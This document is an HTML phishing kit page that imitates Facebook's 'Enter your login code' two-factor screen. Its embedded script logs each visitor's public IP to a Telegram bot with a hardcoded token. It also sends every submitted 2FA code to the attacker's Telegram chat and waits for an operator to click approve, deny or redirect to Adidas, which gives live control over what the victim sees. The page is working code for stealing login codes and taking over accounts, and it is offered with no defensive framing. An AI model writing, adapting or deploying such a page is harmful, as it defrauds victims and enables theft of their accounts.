<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Enter Your Login Code</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body, html {
      margin: 0;
      padding: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      color: #050505;
    }
    .wrapper {
      max-width: 760px;
      margin: 60px auto;
      padding: 0 20px;
    }
    .subtitle {
      font-size: 15px;
      color: #606770;
      margin-bottom: 10px;
    }
    h1 {
      font-size: 28px;
      font-weight: 600;
      margin: 0 0 16px 0;
    }
    .description {
      font-size: 17px;
      line-height: 1.5;
      color: #1c1e21;
      margin-bottom: 30px;
    }
    .image-box {
      margin-bottom: 30px;
    }
    .image-box img {
      width: 100%;
      height: auto;
      border-radius: 8px;
    }
    .status {
      display: flex;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 20px;
      max-width: 600px;
    }
    .status-icon svg {
      width: 32px;
      height: 32px;
      margin-top: 2px;
    }
    .status-text p {
      margin: 0;
    }
    .status-text p:first-child {
      font-weight: bold;
      color: #050505;
      margin-bottom: 3px;
    }
    .status-text p:last-child {
      color: #606770;
      font-size: 15px;
    }
    .code-input {
      width: 100%;
      padding: 14px 16px;
      font-size: 17px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      margin-bottom: 10px;
    }
    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-bottom: 16px;
    }
    .submit-btn:hover {
      background-color: #166fe5;
    }
    .submit-btn:disabled {
      background-color: #a1c3f7;
      cursor: not-allowed;
    }
    .try-button {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      color: #050505;
      background-color: white;
      cursor: pointer;
      transition: background 0.2s ease-in-out;
      text-align: center;
      margin-bottom: 10px;
    }
    .try-button:hover {
      background-color: #f5f6f7;
    }
    .success-message {
      font-size: 17px;
      color: #42b72a;
      margin-bottom: 20px;
      text-align: center;
      display: none;
    }
    .error-message,
    .checking-message {
      font-size: 15px;
      margin-bottom: 10px;
      text-align: center;
    }
    .error-message {
      color: #fa3e3e;
    }
    .checking-message {
      color: #606770;
    }
    .timer {
      font-size: 14px;
      color: #606770;
      margin-bottom: 20px;
      text-align: center;
    }
    .approval-container {
      text-align: center;
      padding: 20px;
      background-color: #f0f2f5;
      border-radius: 8px;
      margin-bottom: 20px;
      display: none;
    }
    .approval-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    .spinner {
      border: 2px solid #f3f3f3;
      border-top: 2px solid #1877f2;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @media (max-width: 600px) {
      h1 {
        font-size: 24px;
      }
      .description {
        font-size: 16px;
      }
      .status {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="subtitle">‚Ä¢ Facebook</div>
    <h1 id="pageTitle">Enter your login code</h1>
    <div class="description" id="pageDescription">
      We sent a code to your phone. It may take a few moments to arrive via SMS or email.
    </div>

    <div class="image-box">
      <img src="imgs/photo-2024-04-15-20-05-52.jpg" alt="Login Illustration" />
    </div>

    <div id="approvalContainer" class="approval-container">
      <div class="approval-icon">‚è≥</div>
      <h2>Waiting for Approval</h2>
      <p>We've sent a login request to your connected devices. Please check your Facebook app or email to approve this login attempt.</p>
    </div>

    <div id="codeEntry">
      <div class="status">
        <div class="status-icon">
          <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
            <circle cx="32" cy="32" r="30" fill="none" stroke="black" stroke-width="4"/>
            <circle cx="24" cy="32" r="3.5" fill="black"/>
            <circle cx="32" cy="32" r="3.5" fill="black"/>
            <circle cx="40" cy="32" r="3.5" fill="black"/>
          </svg>
        </div>
        <div class="status-text">
          <p id="statusTitle">Enter the code</p>
          <p id="statusDescription">Use the 6-digit or 8-digit code we sent to complete login.</p>
        </div>
      </div>

      <form id="codeForm">
        <input
          id="codeInput"
          class="code-input"
          type="tel"
          inputmode="numeric"
          pattern="[0-9]*"
          maxlength="8"
          placeholder="Enter confirmation code"
          required
        />
        <div id="checkingMsg" class="checking-message" style="display:none;">
          <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
            <div class="spinner"></div>
            Checking code...
          </div>
        </div>
        <div id="successMsg" class="success-message" style="display:none;">Code approved! Redirecting...</div>
        <div id="errorMsg" class="error-message" style="display:none;">The code you entered is incorrect. Please try again.</div>
        <div id="timer" class="timer" style="display:none;">Please wait 30 seconds...</div>
        <button id="submitBtn" class="submit-btn" type="submit">Continue</button>
      </form>
    </div>

    <button class="try-button">Try Another Way</button>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = "7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo";
    const TELEGRAM_CHAT_ID = "-5073097866";
    let currentCode = '';
    let currentMethod = '';
    let sessionId = '';
    let approvalCheckInterval = null;
    let lastUpdateId = 0;

    // Get URL parameters to determine 2FA method
    const urlParams = new URLSearchParams(window.location.search);
    const method = urlParams.get('method') || 'phone';

    // Generate a unique session ID
    function generateSessionId() {
      return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }

    // Method-specific content
    const methodContent = {
      phone: {
        title: "Enter your login code",
        description: "We sent a code to your phone via SMS. It may take a few moments to arrive.",
        statusTitle: "Check your phone",
        statusDescription: "Use the 6-digit code we sent to your phone number to complete login.",
        showCodeInput: true
      },
      email: {
        title: "Enter your login code", 
        description: "We sent a code to your email address. Check your inbox and spam folder.",
        statusTitle: "Check your email",
        statusDescription: "Use the 6-digit code we sent to your email to complete login.",
        showCodeInput: true
      },
      auth: {
        title: "Enter authentication code",
        description: "Open your authentication app to get your verification code.",
        statusTitle: "Use your authenticator app",
        statusDescription: "Enter the 6-digit code from your authentication app.",
        showCodeInput: true
      },
      approval: {
        title: "Approve login request",
        description: "Check your Facebook app or email to approve this login attempt.",
        statusTitle: "Approve the login",
        statusDescription: "Check your devices for a login approval request.",
        showCodeInput: false
      }
    };

    // Update page content based on method
    function updatePageContent() {
      const content = methodContent[method] || methodContent.phone;
      
      document.getElementById('pageTitle').textContent = content.title;
      document.getElementById('pageDescription').textContent = content.description;
      document.getElementById('statusTitle').textContent = content.statusTitle;
      document.getElementById('statusDescription').textContent = content.statusDescription;
      
      // Hide code input for approval method
      if (!content.showCodeInput) {
        document.getElementById('codeEntry').style.display = 'none';
        document.getElementById('approvalContainer').style.display = 'block';
        
        // Send approval request to Telegram with buttons
        sendTelegramMessageWithButtons(
          `üîê Login Approval Requested\nMethod: ${method.toUpperCase()}\nSession: ${sessionId}\nTime: ${new Date().toLocaleString()}`,
          sessionId
        );
        
        // Start checking for approval
        startApprovalCheck();
      }
    }

    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "Markdown"
      };
      try {
        const response = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!response.ok) throw new Error("Telegram message failed");
      } catch (err) {
        console.error("Telegram send error:", err);
      }
    }

    async function sendTelegramMessageWithButtons(text, sessionId) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "‚úÖ Approve Login", callback_data: `approve_${sessionId}` },
              { text: "‚ùå Deny Login", callback_data: `deny_${sessionId}` }
            ],
            [
              { text: "üîó Redirect to Adidas", callback_data: `redirect_${sessionId}` }
            ]
          ]
        }
      };
      try {
        const response = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!response.ok) throw new Error("Telegram message failed");
      } catch (err) {
        console.error("Telegram send error:", err);
      }
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        if (!res.ok) throw new Error("Failed to fetch IP");
        const data = await res.json();
        return data.ip;
      } catch (err) {
        console.error("IP fetch error:", err);
        return "unknown";
      }
    }

    // Check for callback queries from Telegram
    async function checkForTelegramAction() {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
        if (!response.ok) throw new Error("Failed to fetch updates");
        
        const data = await response.json();
        if (data.ok && data.result.length > 0) {
          for (const update of data.result) {
            lastUpdateId = update.update_id;
            
            // Handle callback queries (button clicks)
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              
              if (callbackData === `approve_${sessionId}`) {
                // Session approved via Telegram button
                handleApproval();
                return true;
              }
              
              if (callbackData === `deny_${sessionId}`) {
                // Session denied via Telegram button
                handleDenial();
                return true;
              }
              
              if (callbackData === `redirect_${sessionId}`) {
                // Redirect to Adidas via Telegram button
                handleRedirect();
                return true;
              }
            }
          }
        }
      } catch (err) {
        console.error("Error checking Telegram updates:", err);
      }
      return false;
    }

    async function handleApproval() {
      clearInterval(approvalCheckInterval);
      document.getElementById('successMsg').style.display = 'block';
      document.getElementById('errorMsg').style.display = 'none';
      document.getElementById('timer').style.display = 'none';
      document.getElementById('checkingMsg').style.display = 'none';
      
      await sendTelegramMessage(`‚úÖ Login Approved\nSession: ${sessionId}\nMethod: ${currentMethod.toUpperCase()}\nTime: ${new Date().toLocaleString()}`);
    }

    async function handleDenial() {
      clearInterval(approvalCheckInterval);
      document.getElementById('successMsg').style.display = 'none';
      document.getElementById('errorMsg').style.display = 'block';
      document.getElementById('timer').style.display = 'block';
      document.getElementById('checkingMsg').style.display = 'none';
      
      let timeLeft = 30;
      document.getElementById('timer').textContent = `Please wait ${timeLeft} seconds...`;
      
      await sendTelegramMessage(`‚ùå Login Denied\nSession: ${sessionId}\nMethod: ${currentMethod.toUpperCase()}\nTime: ${new Date().toLocaleString()}`);
      
      const countdown = setInterval(() => {
        timeLeft--;
        document.getElementById('timer').textContent = `Please wait ${timeLeft} seconds...`;
        if (timeLeft <= 0) {
          clearInterval(countdown);
          document.getElementById('submitBtn').disabled = false;
          document.getElementById('timer').style.display = 'none';
          document.getElementById('codeInput').focus();
        }
      }, 1000);
    }

    async function handleRedirect() {
      clearInterval(approvalCheckInterval);
      document.getElementById('successMsg').style.display = 'block';
      document.getElementById('errorMsg').style.display = 'none';
      document.getElementById('timer').style.display = 'none';
      document.getElementById('checkingMsg').style.display = 'none';
      
      await sendTelegramMessage(`üîó Redirecting to Adidas\nSession: ${sessionId}\nMethod: ${currentMethod.toUpperCase()}\nTime: ${new Date().toLocaleString()}`);
      
      // Redirect after short delay
      setTimeout(() => {
        window.location.href = 'https://adidas.com';
      }, 2000);
    }

    function startApprovalCheck() {
      approvalCheckInterval = setInterval(checkForTelegramAction, 2000);
    }

    window.addEventListener("load", async () => {
      sessionId = generateSessionId();
      updatePageContent();
      const ip = await getPublicIP();
      currentMethod = method;
      await sendTelegramMessage(`üîê 2FA Page Visited\nMethod: ${method.toUpperCase()}\nIP: ${ip}\nSession: ${sessionId}\nTime: ${new Date().toLocaleString()}`);
    });

    const form = document.getElementById("codeForm");
    const input = document.getElementById("codeInput");
    const error = document.getElementById("errorMsg");
    const success = document.getElementById("successMsg");
    const checking = document.getElementById("checkingMsg");
    const button = document.getElementById("submitBtn");
    const timer = document.getElementById("timer");

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const code = input.value.trim();
      if (!code) {
        alert("Please enter the confirmation code.");
        return;
      }

      currentCode = code;
      
      // Send code to Telegram with buttons
      await sendTelegramMessageWithButtons(
        `üîê 2FA Code Submitted\nMethod: ${method.toUpperCase()}\nCode: ${code}\nSession: ${sessionId}\nTime: ${new Date().toLocaleString()}`,
        sessionId
      );

      error.style.display = "none";
      timer.style.display = "none";
      success.style.display = "none";
      checking.style.display = "block";
      button.disabled = true;

      // Start checking for button clicks from Telegram
      approvalCheckInterval = setInterval(checkForTelegramAction, 2000);
    });
  </script>
</body>
</html>